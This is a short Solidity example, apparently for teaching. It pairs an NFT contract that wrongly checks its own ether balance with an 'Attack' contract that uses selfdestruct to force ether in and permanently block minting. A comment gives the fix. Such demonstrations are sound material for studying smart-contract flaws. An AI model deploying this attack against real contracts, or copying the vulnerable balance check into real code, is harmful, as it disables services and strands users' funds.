//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

// import "hardhat/console.sol";

// Pseudo NFT contract
contract NFT {
    uint public goal = 100 ether;
    uint public totalSupply;
    // uint public balance;
    mapping(uint => address) public ownerOf;

    function mint() public payable {
        require(msg.value == 1 ether, "Must send exactly 1 Ether!");

        // correction:
        // use balance += msg.value instead of
        // address(this).balance
        // balance <= goal

        require(address(this).balance <= goal, "Minting is finished!");

        totalSupply ++;

        ownerOf[totalSupply] = msg.sender;
    }
}

contract Attack {
    NFT nft;

    constructor(NFT _nft) {
        nft = NFT(_nft);
    }

    function attack() public payable {
        address payable nftAddress = payable(address(nft));

        // all balance of Attack contract gets transfered to NFT contract
        selfdestruct(nftAddress);
    }
}
